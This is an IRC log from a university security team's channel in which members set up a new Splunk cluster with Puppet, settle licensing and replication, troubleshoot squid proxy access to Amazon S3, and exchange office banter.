2014-11-06 17:01:22	soehlert	cool. you wanna work on that tomorrow? i can get you the new servers done probably by the end of the day so next week you'll have free run at em
2014-11-06 17:08:39	jazoff	sure
2014-11-06 17:08:59	jazoff	not sure how much the splunk server config can be puppetized
2014-11-06 17:09:15	jazoff	since you do most of it through the web ui
2014-11-06 18:09:22	soehlert	oh ya not that part. i guess i was mixing up my splunk stuff. i meant puppetize the splunk forwarder stuff, though i ugess that's not really a stop on the splunk servers.
2014-11-06 18:09:44	soehlert	i know you said it's in the webUI, but does it just read from conf files and the webUI is just a nice way to do it? 
2014-11-07 08:21:02	jazoff	oh, you can easily puppetize the forwarder
2014-11-07 08:21:25	jazoff	it's just a command or two or push out a few files to configure forwarding
2014-11-07 08:21:32	jazoff	i meant more the cluster
2014-11-07 08:28:00	jazoff	though with the upgrade to the new version of splunk we can use the splunk bro app
2014-11-07 08:48:36	wardog	What size Splunk license do we want? 20G? 25G?
2014-11-07 08:51:01	jazoff	20G should do it
2014-11-07 08:52:38	jazoff	soehlert: can we do the supercell upgrade after the new splunk cluster is running? that might make some things easier
2014-11-07 08:52:51	jazoff	that way it can be redeployed with the latest splunk from the get go
2014-11-07 08:54:41	wardog	Ok, we'll start with 20, if we bump a ceiling it's easy to add more
2014-11-07 09:19:07	jazoff	ah, found how the netflow is cleaned up.. roots crontab
2014-11-07 09:19:08	jazoff	# Remove all flow logs from the archive older than a year
2014-11-07 09:19:08	jazoff	30 1 * * * find /data/nfdump/ -type f -ctime +365 -exec rm -f {} \;
2014-11-07 09:19:12	jazoff	need to move that to puppet
2014-11-07 09:41:33	soehlert	jazoff: ya we can do that
2014-11-07 10:39:55	jazoff	need to figure out how to get the spam detection policy to not count forwarded mail
2014-11-07 10:44:42	jazoff	ah, i think it is picking up mail going to UI for spam reasons
2014-11-07 10:44:44	jazoff	192.17.219.241
2014-11-07 11:11:43	soehlert	jazoff: these hw splunk boxes, would they benefit from twice the ram and twice the cpu?
2014-11-07 11:15:06	soehlert	and what kinda specs do the manager and search box need?
2014-11-07 11:19:33	soehlert	jschipp: that text we got was about not the real seclogs. sorry didnt realize you were still monitoring it
2014-11-07 11:19:42	jazoff	twice the ram from what? 
2014-11-07 11:20:07	soehlert	he's not working today is he..?
2014-11-07 11:20:07	soehlert	sorry twice the ram as our normal hw server (24G_
2014-11-07 11:20:30	jazoff	24G on each should be enough, unless we have tons of spare ram
2014-11-07 11:21:05	jazoff	the search head should be fine with like 4G, the manager should be fine with 2 ( i don't think it does much)
2014-11-07 11:21:17	jazoff	we can monitor and add more if neede
2014-11-07 11:24:30	soehlert	we have enough spare to easily get to 48 for both of the hw machines
2014-11-07 11:26:25	jazoff	well it won't make splunk slower :)
2014-11-07 11:26:36	jazoff	being able to have a ton of data cached in ram will definitely speed thing sup
2014-11-07 11:28:55	soehlert	ok i'll make it happen then.
2014-11-07 11:29:32	jazoff	cool
2014-11-07 11:29:46	jazoff	so I think all we need to do to deploy splunk is copy the rpm to repo-sec and tell puppet to install it
2014-11-07 11:30:04	jazoff	though not sure if that will try to do the accept license prompt
2014-11-07 11:34:20	soehlert	prolly need an expect script for that like i had to do with ossec (even though that rpm was bad, the expect script worked)
2014-11-07 11:39:17	wardog	soehlert: jschipp is taking vacation day today.
2014-11-07 11:39:20	wardog	wedding or something.
2014-11-07 11:41:27	soehlert	right right. i rememberd that right after i sent that for him
2014-11-07 11:42:18	jazoff	soehlert: it does have a way to be started and pre-accept the license.. that's how I did it on debian
2014-11-07 11:43:00	jazoff	/opt/splunkforwarder/bin/splunk start --accept-license
2014-11-07 11:43:03	jazoff	is what I used to use
2014-11-07 11:43:25	soehlert	ahh didnt know that was an option, maybe you can make that work
2014-11-07 11:43:31	soehlert	gahhh i hate these stupid hp rails..
2014-11-07 11:52:29	jschipp	soehlert: ah, I think I forgot to remove the seclogs definition file from the nagios server
2014-11-07 11:52:48	jschipp	I ended up doing more work than I wanted to today :/
2014-11-07 11:53:07	jschipp	Doris asked me to talk about ISLET at the Bro Teaching meeting
2014-11-07 11:59:56	soehlert	eyrich you around?
2014-11-07 12:00:21	soehlert	jschipp: well there's a new seclogs, but nagios was monitoring the old one. so however you need to make that switch. i just don't wanna ignore the centos one
2014-11-07 12:02:58	wardog	jschipp: Wayland and I may have sold ISLET for the Digital Forensics class.
2014-11-07 12:04:00	jschipp	wardog: that's what I heard :) :) :)
2014-11-07 12:06:35	soehlert	is eyrich in today and just at lunch or is he off today?
2014-11-07 12:41:27	soehlert	jazoff: do you have role::profile set up for the new splunk boxes?
2014-11-07 12:44:45	jazoff	no
2014-11-07 12:45:00	eyrich	am now 
2014-11-07 12:45:07	jazoff	there is a splunk::server class though
2014-11-07 12:45:07	eyrich	at lunch/meeting
2014-11-07 12:45:26	jazoff	oh, we do have a role profile
2014-11-07 12:45:34	jazoff	secapps/splunk of all things
2014-11-07 12:46:12	soehlert	jazoff: i get that, but wont splunk indexers get a diff profile than splunk master and splunk search?
2014-11-07 12:46:25	soehlert	eyrich: that's fine, can you swap a port on rack 3's switch for me to private please?
2014-11-07 12:46:33	jazoff	hmm. yeah
2014-11-07 12:46:46	eyrich	yes - send me the port
2014-11-07 12:46:49	soehlert	seems like we should do a splunk role with 3 different profiles
2014-11-07 12:47:01	soehlert	eyrich: 12
2014-11-07 12:47:21	jazoff	yeah, the class I have now basically just sets up teh firewall
2014-11-07 12:47:30	soehlert	i thought that was the case
2014-11-07 12:48:02	eyrich	do it now?
2014-11-07 12:48:19	eyrich	the description was seclogs - what should it be now?
2014-11-07 12:49:15	soehlert	ya do it now. desc - splunki2-sec
2014-11-07 12:50:25	eyrich	comitting now
2014-11-07 12:50:58	eyrich	done
2014-11-07 12:50:58	soehlert	thanks
2014-11-07 13:00:38	soehlert	jazoff: splunki1-sec is now ready for you. i'll let you decide how you wanna do the role::profile. kerb auth is working on it as well so you should be good to go
2014-11-07 13:01:41	jazoff	ok. going to re-review the splunk cluster docs
2014-11-07 13:03:16	soehlert	cool no rush just letting you know. on to splunki2-sec
2014-11-07 13:46:23	 *	jschipp on a support call with GoToMeeting about failed meeting recordings, fml
2014-11-07 14:33:31	soehlert	jazoff: splunki2-sec is ready btw
2014-11-07 14:36:57	wardog	I put in a request for campus splunk license.
2014-11-07 14:38:14	soehlert	i pulled a justin, i'm gonna go get some lunch. i might as well go full justin and get some meat too..
2014-11-07 14:38:34	wardog	don't forget to walk the dog too
2014-11-07 14:38:49	soehlert	ooo right. 
2014-11-07 15:54:22	soehlert	wardog: did you see boyer's response to the grid-sec stuff?
2014-11-07 15:56:12	jazoff	ok, read all the splunk docs again
2014-11-07 15:56:21	jazoff	does not look like anything has changed, seems pretty straightforward
2014-11-07 15:56:41	jazoff	you can setup the cluster using the web interface, or in theory by just editing the config files
2014-11-07 15:56:49	jazoff	so can possibly get puppet to pre set things up
2014-11-07 15:58:26	wardog	I did
2014-11-07 15:58:36	wardog	Testing the email part.
2014-11-07 15:58:51	soehlert	jazoff: cool.
2014-11-07 15:58:54	soehlert	wardog: alright
2014-11-07 15:59:08	wardog	But everything looks good. Just need to transfer the wiki over.
2014-11-07 16:03:45	jazoff	so, we want to use replication factor of 2 right?
2014-11-07 16:05:06	jazoff	or do we not care about redundancy and just want performance
2014-11-07 16:09:14	wardog	Woohoo!
2014-11-07 16:09:22	wardog	the email for grid-sec is working
2014-11-07 16:09:43	soehlert	sweet
2014-11-07 16:09:53	soehlert	jazoff: not familiar with what you're talking about
2014-11-07 16:10:30	soehlert	but if you mean as far as backing up the logs on splunk that doesn't seem worth it right? all those logs are backed up from their original collection machine
2014-11-07 16:13:03	soehlert	jazoff: splunkmaster-sec should be good to go
2014-11-07 16:13:32	jazoff	soehlert: with 2 indexes you can have it mirror the logs on both, or just load balance across the two
2014-11-07 16:14:03	jazoff	it's kinda more for having like 10 index boxes and replication factor of 2 or 3
2014-11-07 16:16:30	soehlert	but is there any advantage on the front end? as in would anyone using splunk search node even notice
2014-11-07 16:16:36	jazoff	no
2014-11-07 16:16:44	jazoff	only if one of the index boxes was down
2014-11-07 16:16:47	jazoff	then half the logs would be missing
2014-11-07 16:19:13	soehlert	do you think we have enough stuff going into splunk we'd need to worry that much about performance? it seems like replication would be best because the only way it affects us is if the box goes down, but replication would fix that right?
2014-11-07 16:33:17	jazoff	well you also would get 2x the storage i think
2014-11-07 16:33:23	jazoff	basically think of it as raid0 vs raid1
2014-11-07 16:33:37	jazoff	though a little different since if one box dies you can still index until the other one comes back
2014-11-07 16:35:28	soehlert	gotcha
2014-11-07 16:35:46	soehlert	meh i dont thikn storage is at a premium for us, i think redundant is the way to go
2014-11-07 16:37:09	jazoff	ok
2014-11-07 16:48:05	jazoff	anyone have a splunk account to download the rpms?  I used to have one but I forgot the password and if I sign up now i'm just going to get spammed :)
2014-11-07 16:58:35	soehlert	lemme check in a sec
2014-11-07 16:59:50	soehlert	nope sorry
2014-11-07 17:03:46	soehlert	two more puppet runs and then kerb auth and splunks-sec will be ready too. which should mean the whole cluster is good to go
2014-11-07 17:05:29	jazoff	ok :)
2014-11-07 17:05:33	soehlert	ok perfect. splunk cluters done
2014-11-07 17:05:39	soehlert	which means im calling it a day/week
2014-11-07 17:05:50	jazoff	i think first step is get rpms installed, then i can see about puppetizing some stuff
2014-11-07 17:06:00	soehlert	sounds fair
2014-11-07 17:06:06	jazoff	may need to use the web UI to figure out what files it changes, then put those into puppet and blow it away and reinstall automated
2014-11-07 17:06:28	jazoff	splunk gets confusing because there is a deployment server you can use for larger deployments
2014-11-07 17:06:31	soehlert	ya i kinda figured. that's the shitty part about puppet, ya gotta do it manually first and then redo it 
2014-11-07 17:06:32	jazoff	but I dont think it helps in our case
2014-11-07 17:07:08	jazoff	well it's more that splunk can do things with the web UI and with the config files, but the docs are a little confusing
2014-11-07 17:07:26	jazoff	so it's probably easier in the long run to just use the interface instead of figuring out what i'm supposed to change
2014-11-07 17:07:39	jazoff	I can actually just install it, copy /opt/splunk, make the changes, and then diff it :)
2014-11-07 17:08:13	jazoff	it's either work out how to get puppet to set things up, or document the UI based setup really well in the wiki.. i'd rather it just be automated
2014-11-07 17:08:16	soehlert	that works too
2014-11-07 17:08:36	soehlert	i'd rather automated too. the bro cluster stuff really put in my head how awesome that process is
2014-11-07 17:08:49	soehlert	kickstart, change interface, update, add to puppet, kerb auth
2014-11-07 17:08:52	soehlert	puppet does the rest
2014-11-07 17:09:00	jazoff	then fight with broctl, but yeah :)
2014-11-07 17:09:09	soehlert	ya but i didnt have to do that :)
2014-11-07 17:09:28	jazoff	would be even nicer if we were using the name based classifier stuff or something like foreman or that razer thing
2014-11-07 17:09:47	jazoff	or what's it called.. cobbler?
2014-11-07 17:10:05	soehlert	foreman or cobbler. idk i looked into them and it doesnt seem like it saves any time.
2014-11-07 17:10:08	jazoff	then those steps mostly become "select a machine in the UI and tell it to make it a new bro prod cluster worker"
2014-11-07 17:10:46	soehlert	unless i wasnt understanding, it looked like i still had to do the hostname/ip stuff manually as well as kerb auth
2014-11-07 17:10:46	soehlert	so i guess it saves the update and add to puppet steps? maybe
2014-11-07 17:11:07	jazoff	well like, imagine if the machines were already in the rack and ready to go, just no OS
2014-11-07 17:11:32	jazoff	there's tools that you can just run a few commands or click and say "this box should be an ESXi node"
2014-11-07 17:11:49	jazoff	or "this should be a centos machine running puppet"
2014-11-07 17:12:55	soehlert	ya i guess. idk doesnt seem like it saves that much, but i'll probably play with one once we get past this centos stuff and everything is more or less puppetized.
2014-11-07 17:13:09	soehlert	maybe i just need to use it to fully get it. that's often the case for me
2014-11-07 17:16:44	soehlert	anyways, i'm off. have a good weekend
2014-11-08 12:54:45	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Ping timeout)
2014-11-08 13:00:50	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-11-10 07:42:04	jazoff	morning :)
2014-11-10 09:15:28	soehlert	yo
2014-11-10 09:28:42	wardog	ayo
2014-11-10 09:57:24	wardog	Well, the 20G licenses is ready.
2014-11-10 09:57:37	wardog	They said our collector is already connected and using it though.
2014-11-10 10:01:37	jazoff	oh?
2014-11-10 10:01:46	wardog	Supposedly.
2014-11-10 10:02:00	wardog	I dind't know if somehow you had set up the new systems and directed them at the campus licensing server.
2014-11-10 10:03:22	wardog	Not seeing anything indicating cyclone connecting to it
2014-11-10 10:03:26	wardog	Although, it did in the past.
2014-11-10 10:07:05	soehlert	i didnt point them to the new stuff did you jazoff?
2014-11-10 10:07:46	wardog	I don't even remember what the campus licensing server is.
2014-11-10 10:07:58	jazoff	nope
2014-11-10 10:08:12	jazoff	though I do remember seeing something in cyclone that was referencing the campus licensing server
2014-11-10 10:08:16	jazoff	but I didnt' configure it
2014-11-10 10:08:21	soehlert	hmm well thats strange
2014-11-10 10:08:30	jazoff	i'm working on puppet configs for the new servers now
2014-11-10 10:08:44	wardog	It's currently configured as a master licensing server. I wonder if the old slave config is still running int he background somehow.
2014-11-10 10:47:53	jazoff	well, I got splunk to install via puppet to the two indexers
2014-11-10 10:49:17	soehlert	sweet
2014-11-10 10:51:36	soehlert	i was about to complain about bwbh_user_check not working after I just spent a few minutes trying to figure it out. should pay more attention to my emails haha thanks jschipp 
2014-11-10 10:56:22	wardog	maybe add a history log to the script. 'Last action by jschipp on 11/10, user username'
2014-11-10 10:58:08	soehlert	meh i dont think it's important. just adds complexity. theres already a fix. try a couple times, it doesn't find anything, check email, oh ok ticket is taken care of.
2014-11-10 10:58:20	soehlert	it should also show in the jira room here, which would have helped
2014-11-10 10:58:34	soehlert	looks like ncsabot isn't in #jira
2014-11-10 10:59:15	wardog	jazoff: the campus splunk licensing server is splunk-licensing.opia.illinois.edu
2014-11-10 10:59:25	wardog	feel free to configure the indexers when they're ready.
2014-11-10 10:59:40	wardog	Do we want to set up authentication against the Security AD, local or something else?
2014-11-10 10:59:44	jschipp	I invited him:  /invite ncsabot 
2014-11-10 10:59:48	soehlert	NOT LOCAL
2014-11-10 10:59:59	soehlert	good lord please not another local password
2014-11-10 11:00:07	jazoff	ok
2014-11-10 11:00:12	wardog	Isn't that what lastpass is for. ;)
2014-11-10 11:00:18	jazoff	the only issues i've had with that is splunk doesn't (or didn't?) support api keys
2014-11-10 11:00:25	jazoff	so you'd have to hardcode ad passwords in scripts
2014-11-10 11:00:43	wardog	It's not possible to do a mix?
2014-11-10 11:00:49	jazoff	not the last time I looked
2014-11-10 11:00:52	jazoff	but that was a few versions ago
2014-11-10 11:01:22	wardog	I would think you should always have a local admin account available in case of auth failures.
2014-11-10 11:01:32	jazoff	oh, that works I think
2014-11-10 11:01:36	soehlert	definitely that but i'd prefer sec AD whenever possible
2014-11-10 11:01:40	wardog	but no other local accounts?
2014-11-10 11:01:46	jazoff	not that i remember
2014-11-10 11:01:52	wardog	SEC AD works
2014-11-10 11:03:23	jazoff	soehlert: krb doesn't work to splunkmaster-sec
2014-11-10 11:04:04	jazoff	which unrelated, sounds hiliariously like funkmaster flex
2014-11-10 11:06:08	soehlert	someone caught my joke :)
2014-11-10 11:06:12	wardog	Although I'm not really interested in it, 'Dumb and Dumber To' is actually a very clever title.
2014-11-10 11:06:39	soehlert	im going to see it, it's going to be awful, and i'm going to like it
2014-11-10 11:07:23	jazoff	dog needs walk, bbs.
2014-11-10 11:07:36	jazoff	should be able to get most of splunk running
2014-11-10 11:08:18	jazoff	not sure how to copy over any data from old splunk though.. they have docs for that, but not for a (huge version upgrade + moving servers + moving to cluster)
2014-11-10 11:08:46	soehlert	hah ya this is a bit of a changeup
2014-11-10 11:10:01	wardog	What do you want to copy?
2014-11-10 11:10:13	wardog	Or just index data?
2014-11-10 11:10:15	jazoff	not much actually.. maybe the gulp index that has the normalized auth data
2014-11-10 11:17:24	soehlert	kerb fixed on funkmaster flex
2014-11-10 11:37:45	jazoff	i'e been moving the new splunk boxes to development
2014-11-10 11:37:59	jazoff	othewise tweaking the puppet stuff is going to be a mess
2014-11-10 11:41:07	soehlert	fair enough
2014-11-10 11:54:12	soehlert	jazoff: i think the web hook might be messed up for puppet..nothing to commit, working directory clean. which makes sense since i just pushed my changes to the ntp module. they don't show up on puppet-sec though
2014-11-10 11:54:41	soehlert	nvm looking at the wrong window
2014-11-10 12:01:36	jazoff	soehlert: did you see the imessage thing?
2014-11-10 12:03:57	soehlert	yup i did. i somehow managed to get my number deregistered a while ago, though i'm not sure how. i tried the tool to be safe and that's what it told me
2014-11-10 12:04:02	soehlert	were you still registered?
2014-11-10 12:07:47	jazoff	no, ive never had an iphone
2014-11-10 12:09:19	jazoff	well, I think the cluster is setup
2014-11-10 12:09:57	soehlert	ahh well that makes it easy
2014-11-10 12:10:00	soehlert	sweet
2014-11-10 12:10:19	soehlert	wait, what was your last commit haha. you pushed to puppet "stuff not done in puppet"
2014-11-10 12:10:36	jazoff	yeah, just notes in a TODO file
2014-11-10 12:11:41	soehlert	i figured it was something like that, just a funny thing to put
2014-11-10 12:15:14	jazoff	doh, accidentally made splunki1-sec the search head
2014-11-10 12:15:22	jazoff	and changing it back worked but now the master things a search head is down
2014-11-10 12:16:10	jazoff	ah, restarting fixed it
2014-11-10 12:18:57	jazoff	oh, fun http://docs.splunk.com/Documentation/Splunk/6.2.0/Indexer/Configurethepeerindexes
2014-11-10 12:20:33	wardog	Do we need to add more storage for the index nodes?
2014-11-10 12:21:44	jazoff	well /opt should certainly have more space
2014-11-10 12:22:00	jazoff	ah, /opt is on / ? meh
2014-11-10 12:23:23	soehlert	ya it always has been. but i guess we can mount a new drive there if that's a big issue
2014-11-10 12:23:35	soehlert	we hardly ever use opt
2014-11-10 12:23:42	jazoff	yeah
2014-11-10 12:23:55	soehlert	if you just need more space i have a bunch more i can put towards it
2014-11-10 12:24:15	jazoff	yeah, almost all the space would be good :)
2014-11-10 12:24:26	soehlert	240GB?
2014-11-10 12:25:41	wardog	http://docs.splunk.com/Documentation/Splunk/6.2.0/Indexer/Migratenon-clusteredindexerstoaclusteredenvironment
2014-11-10 12:27:50	soehlert	jazoff: do you want the full 240? do you need more?
2014-11-10 12:28:12	jazoff	how much we got? :)
2014-11-10 12:28:27	jazoff	more disk space we have the more will fit before it gets expired
2014-11-10 12:29:14	soehlert	240 available. if you want me to get more i can create a new disk and mount it to /opt
2014-11-10 12:29:22	soehlert	though there's a bit of a limbo there then of course
2014-11-10 12:29:27	jazoff	create a new disk?
2014-11-10 12:30:38	soehlert	oh hell those are hardware...doh
2014-11-10 12:33:07	jazoff	ah, forgot to each lunch :)
2014-11-10 12:33:16	soehlert	well 240 coming your way then.
2014-11-10 12:37:59	soehlert	wardog: what do i do about this? https://jira.ncsa.illinois.edu/browse/BWCC-667
2014-11-10 12:38:07	soehlert	anyone know amazon s3 well?
2014-11-10 12:38:20	jazoff	i do
2014-11-10 12:38:22	soehlert	he's basically asking me to do his work for him, but i have no idea or access to make it work
2014-11-10 12:38:45	soehlert	ok i need to test our squid rules that would allow them to get to s3, but i have no idea how they build the url
2014-11-10 12:39:18	soehlert	and all he gave me was the s3 commands which i cant run on squid-sec
2014-11-10 12:39:25	jazoff	oh
2014-11-10 12:39:57	wardog	I guess just coordinate with him to have him test it out?
2014-11-10 12:40:06	jazoff	s3.amazonaws.com
2014-11-10 12:40:33	jazoff	http://docs.aws.amazon.com/general/latest/gr/rande.html#s3_region
2014-11-10 12:40:37	wardog	I guess they need to provide the config file?
2014-11-10 12:41:04	soehlert	well he gave me this: cloudfront_host = cloudfront.amazonaws.com 
2014-11-10 12:41:04	soehlert	host_base = s3.amazonaws.com 
2014-11-10 12:41:04	soehlert	host_bucket = %(bucket)s.s3.amazonaws.com 
2014-11-10 12:41:04	soehlert	simpledb_host = sdb.amazonaws.com 
2014-11-10 12:41:04	soehlert	website_endpoint = http://%(bucket)s.s3-website-%(location)s.amazonaws.com/ 
2014-11-10 12:41:16	soehlert	but just whitelisting amazonaws.com seems a little much
2014-11-10 12:41:25	jazoff	what are they trying to do?
2014-11-10 12:41:28	soehlert	is the URL generated dynamically per request?
2014-11-10 12:41:39	soehlert	"We would like to use the Amazon S3 service to upload big dumps(10+ GBs) for Seagate directly from the sonexion management nodes snx1100[1,2,3]n00[0,1]. "
2014-11-10 12:41:48	jazoff	then they just need 
2014-11-10 12:41:48	jazoff	s3.amazonaws.com
2014-11-10 12:43:13	soehlert	hmm ok, that seems a bit loose for my liking, but if we agree that's acceptable then I guess that's that.
2014-11-10 12:43:41	jazoff	the client just talks to s3
2014-11-10 12:43:54	jazoff	the website stuff is only for downloading files from s3 using http
2014-11-10 12:44:13	jazoff	since they are just uploading they just need the main s3 endpoint
2014-11-10 12:44:19	soehlert	ok
2014-11-10 12:46:12	jazoff	it may redirect the client though to one of the more specific names though
2014-11-10 12:47:08	soehlert	well that's a concern too. if i whitelist the s3.amazonaws.com domain, will that cover everything? or just the initial negotiations?
2014-11-10 12:47:39	jazoff	i'd start with that
2014-11-10 12:47:41	jazoff	should work
2014-11-10 12:48:31	soehlert	ok
2014-11-10 12:51:17	soehlert	in other news, indexers have more space now
2014-11-10 12:51:26	jazoff	cool
2014-11-10 14:50:15	soehlert	jesus christ people asking for stuff to get whitelisted in squid and then saying its broken when they dont point anything to squid needs to stop
2014-11-10 14:52:57	soehlert	especially when the documentation says how to do it..
2014-11-10 15:02:22	jschipp	soehlert: Where you at? eyrich is about to steal your Kung-pao pretzels
2014-11-10 15:03:25	soehlert	working from the car dealership place today. was supposed to just be for a bit..
2014-11-10 15:03:28	soehlert	he can have em
2014-11-10 15:03:33	eyrich	i was kidding
2014-11-10 15:03:45	soehlert	meh its fine if you want em
2014-11-10 15:32:39	eyrich	soehlert: do you have https_port enabled on squid?
2014-11-10 15:33:14	eyrich	wait never mind
2014-11-10 15:33:18	soehlert	?
2014-11-10 15:36:55	soehlert	the never mind is because that's not necessary right?
2014-11-10 15:37:20	eyrich	yes
2014-11-10 15:38:59	eyrich	what server is 10.5.0.252
2014-11-10 15:39:14	eyrich	is that bwbh1
2014-11-10 15:39:30	wardog	Cookie Break at 2pm on Wednesday. We should do whiparound earlier so we don't miss out on cookies.
2014-11-10 15:40:04	jazoff	eyrich: dns says bwfw2.internal.ncsa.edu
2014-11-10 15:40:10	eyrich	ok
2014-11-10 15:40:26	soehlert	bwbh2
2014-11-10 15:40:50	soehlert	ohh 252
2014-11-10 15:40:53	soehlert	242 is bwbh2
2014-11-10 15:41:30	eyrich	242 is what i means
2014-11-10 15:41:31	eyrich	meant
2014-11-10 15:42:35	soehlert	oh that's bwbh2 which is the current squid server
2014-11-10 15:42:46	soehlert	why?
2014-11-10 15:42:52	eyrich	im looking into the issue
2014-11-10 15:43:32	soehlert	not sure there's an issue he just didn't set up the proxy settings 
2014-11-10 15:43:32	soehlert	unless you're talking about Joe testing the new squid server.
2014-11-10 15:44:00	eyrich	nirmal has been updating the ticket - thv env vairble have not worked yet
2014-11-10 15:45:18	soehlert	ah crap he has. i see. thanks for the help. 
2014-11-10 15:48:27	eyrich	np - just trying to help, it was a topic in teh BW CC meeting this morning
2014-11-10 15:49:07	soehlert	oh good question, squid listens to the 10.5...are these on the 10.5?
2014-11-10 15:50:32	eyrich	he says source IPs are all on 10.5 in a earlier comment. I wanted to know for log parsing
2014-11-10 15:51:05	soehlert	ahh 
2014-11-10 15:54:12	soehlert	i dont see anything in the access log from that ip
2014-11-10 16:00:36	eyrich	agreeed
2014-11-10 16:01:00	eyrich	do we have access from the machine he is testing from?
2014-11-10 16:01:11	eyrich	to the machine i mean
2014-11-10 16:01:54	soehlert	i dont think so but i can check
2014-11-10 16:02:01	eyrich	[root@bwbh2 squid]# ssh 10.5.0.35
2014-11-10 16:02:02	eyrich	Permission denied (hostbased).
2014-11-10 16:02:52	soehlert	nope not from bw-esms or bwsmw
2014-11-10 16:02:55	eyrich	i think we need to make sure dns and network paths are correct
2014-11-10 16:02:57	soehlert	maybe boot node?
2014-11-10 16:03:09	soehlert	nope
2014-11-10 16:03:14	soehlert	ya that might be a good idea
2014-11-10 16:04:03	eyrich	can you work on getting access from them, Im heading out
2014-11-10 16:05:09	soehlert	i can't i have to leave to
2014-11-10 16:05:27	soehlert	i can work on it tomorrow though
2014-11-11 07:43:19	jazoff	so I got data going into the new splunk cluster
2014-11-11 07:43:29	jazoff	the fancy splunk bro app is not quite working though
2014-11-11 07:43:34	jazoff	fields aren't being extracted
2014-11-11 07:50:04	jazoff	oh, lol, I think I see why
2014-11-11 07:50:06	jazoff	they match on [source::...bro.*.log]
2014-11-11 07:50:16	jazoff	but we use /bro so that simply does not match
2014-11-11 09:32:36	soehlert	so who wants to laugh at my expense? I've been looking for my keys for a little bit from now, and just realized where they are. in my car. at the dealership. :( So I don't have my office key, but even worse, a way to unlock my house if I leave. So I'm going to work from here and hopefully go get my keys later today. 
2014-11-11 09:48:36	jazoff	:)
2014-11-11 09:54:42	eyrich	nirmal is making me crazy
2014-11-11 09:54:53	jazoff	what's a nirmal?
2014-11-11 09:55:02	eyrich	https://jira.ncsa.illinois.edu/browse/BWCC-667
2014-11-11 09:55:41	eyrich	BTWL soehlert when I said Nirmal was the go to guy I was wrong, mistaken identity - I meant Sharif
2014-11-11 09:55:43	soehlert	hahah
2014-11-11 09:55:43	soehlert	ya i saw that
2014-11-11 09:55:51	soehlert	ahhh gotcha
2014-11-11 09:56:24	soehlert	so i presume we didnt go throw the fw in the first place because of the heavy load?
2014-11-11 09:56:58	eyrich	bugger issue is can not restrict to FQDNs - IPs only
2014-11-11 09:57:18	jazoff	ah, that will be problematic with something as complicated as s3
2014-11-11 09:57:25	soehlert	oh right and s3 wont workw ell
2014-11-11 09:57:28	eyrich	Adam does not like that I had to allow craymon to go anywhere on 80/443
2014-11-11 09:57:46	eyrich	jazoff: yep
2014-11-11 09:58:11	soehlert	so this must be a limitation of squid right? or at least how we have squid set up?
2014-11-11 09:58:28	soehlert	also, didnt you try to log into craymon from bwbh yesterday and it failed?
2014-11-11 09:58:40	eyrich	nope - s3cmd doesnt allow proxy use when https is also enabled
2014-11-11 09:58:58	eyrich	i had to ssh before becoming root on bwbh
2014-11-11 09:58:58	soehlert	ahhh ok that makes me feel better, at least its not my fault :)
2014-11-11 09:59:17	soehlert	oh ya you never escalate on root
2014-11-11 09:59:23	soehlert	errr on bwbh
2014-11-11 09:59:45	eyrich	squid seems ot be allowing https  fine
2014-11-11 09:59:46	eyrich	 TCP_MISS/200 3117 CONNECT xmlrpc.rhn.redhat.com:443 - DIRECT/209.132.183.44 -
2014-11-11 10:00:04	soehlert	cool
2014-11-11 10:00:21	jazoff	ah, that is in CONNECT mode though
2014-11-11 10:00:32	jazoff	i think not all apps support that sort of thing
2014-11-11 10:01:23	jazoff	why can't they just use gridftp for this? :)
2014-11-11 10:01:34	eyrich	not on machines with public IPs
2014-11-11 10:04:01	soehlert	jazoff: what dont all apps support?
2014-11-11 10:04:11	jazoff	CONNECT through a proxy or ssl
2014-11-11 10:04:20	jazoff	for
2014-11-11 10:05:43	soehlert	as opposed to squid caching it for them?
2014-11-11 10:05:55	soehlert	or just in general cant do ssl over proxy?
2014-11-11 10:06:08	eyrich	I think connect is basically port fowardning through the squid box
2014-11-11 10:06:17	jazoff	yeah, as opposed to sending the get request for the https url
2014-11-11 10:06:18	jazoff	correct
2014-11-11 10:06:25	soehlert	ya it's a transparent proxy
2014-11-11 10:06:40	soehlert	the way we have it set that is
2014-11-11 10:07:15	eyrich	not transparent - we explicilty require hosts to use the proxy
2014-11-11 10:07:52	eyrich	transparent uses firewalls/routers to push traffic through the proxy - no client config required
2014-11-11 10:08:52	soehlert	hmm i must have misread something. it looked like squid had two modes, what they call transparent proxy or caching mode
2014-11-11 10:12:39	wardog	those aren't mutually exclusive
2014-11-11 10:14:34	soehlert	ya i must have misread something then
2014-11-11 10:31:14	jazoff	wardog: need to plan trip.. any weeks look good?
2014-11-11 10:32:31	wardog	Hmmm...
2014-11-11 10:33:30	wardog	Dunno. Anyone know of any important dates that Justin should be in town for?
2014-11-11 10:36:25	soehlert	i got nothing
2014-11-11 10:36:52	wardog	Maybe we should schedule this when he comes down. http://roomescapeadventures.com/chicago/
2014-11-11 10:37:07	wardog	er, comes up
2014-11-11 10:37:24	wardog	oh, there's one in atlanta.
2014-11-11 10:37:48	jazoff	neat
2014-11-11 10:38:06	jazoff	well, "tucker"
2014-11-11 10:39:00	wardog	found a gif of Adam as a child https://i.imgur.com/LPowk.gif
2014-11-11 10:44:27	soehlert	wait, you just try to escape the room?
2014-11-11 10:44:48	soehlert	and terrible form on that deadlift..
2014-11-11 10:48:37	wardog	yes, you have 60 minutes to escape the room.
2014-11-11 10:48:53	wardog	And, the deadlift, give him a break, he was 7
2014-11-11 10:48:59	wardog	or looks like 7
2014-11-11 10:51:44	jazoff	damn, I thought I fixed the smtp alert false positives
2014-11-11 10:54:14	jazoff	ah, I don't think i'm loading the neighbor nets file
2014-11-11 10:54:22	jazoff	so it's still counting mail between ncsa and cites
2014-11-11 10:54:35	soehlert	wardog: ya I know, I was being a bit of a smartass. though deadlift is NOT a lift you wanna do wrong ever..
2014-11-11 10:54:43	soehlert	easy fix though jazoff 
2014-11-11 10:55:01	wardog	Anyone want any oranges. If you don't want to eat them you can throw one (after cutting) into your garbage disposal to clean it out a little.
2014-11-11 10:56:04	wardog	soehlert: I've notoriously had lower back issues due to weak muscles, I understand completelt.
2014-11-11 11:02:39	jazoff	ok, fix on it's way to bro-dev :)
2014-11-11 11:02:43	jazoff	was very confused why that wasn't working
2014-11-11 11:06:02	jschipp	wardog: do you have the oranges with you?
2014-11-11 11:07:21	soehlert	i don't think i ever expected to see that sentence in here.
2014-11-11 11:08:29	wardog	Yes, on my desk
2014-11-11 11:08:49	wardog	The oranges are in the bag. Over.
